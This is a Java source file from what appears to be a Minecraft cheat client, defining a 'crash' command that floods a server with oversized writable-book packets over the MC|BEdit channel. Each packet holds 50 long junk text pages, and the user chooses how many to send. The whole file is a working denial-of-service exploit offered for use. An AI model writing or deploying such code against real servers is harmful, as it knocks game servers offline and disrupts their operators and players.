package ru.zalupa.command.commands;

import dev.xdark.clientapi.item.ItemStack;
import dev.xdark.clientapi.item.ItemTools;
import dev.xdark.clientapi.item.Items;
import dev.xdark.clientapi.nbt.NBTTagCompound;
import dev.xdark.clientapi.nbt.NBTTagList;
import dev.xdark.clientapi.nbt.NBTTagString;
import dev.xdark.feder.NetUtil;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import ru.zalupa.Zalupa;
import ru.zalupa.command.Command;
import ru.zalupa.command.context.CommandContext;
import ru.zalupa.command.parameter.Parameter;
import ru.zalupa.command.type.TypeInteger;

public class CrashCommand extends Command {
    public CrashCommand() {
        super("crash", "Crash server by packets");
        parameter(new Parameter<>("count", new TypeInteger()));
    }

    public void execute(CommandContext ctx) {
        ByteBuf buf = Unpooled.buffer();
        ItemStack item = Items.WRITABLE_BOOK.newStack(1, 1);

        NBTTagList list = NBTTagList.of();
        NBTTagCompound tag = NBTTagCompound.of();

        for (int i = 0; i < 50; i++) {
            NBTTagString text = NBTTagString.of("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
            list.add(text);
        }

        tag.put("author", "Zabelov");
        tag.put("title", "Suck");
        tag.put("pages", list);

        item.setTagCompound(tag);

        ItemTools.write(item, buf);

        ctx.sendMessage("§8[§cZalupa§8] §fSending §c%s§f packets...", ctx.<Integer>getArg(0));
        for (int i = 0; i < ctx.<Integer>getArg(0); i++)
            Zalupa.getApi().clientConnection().sendPayload("MC|BEdit", buf);
        ctx.sendMessage("§8[§cZalupa§8] §fAttack compiled!");
    }
}
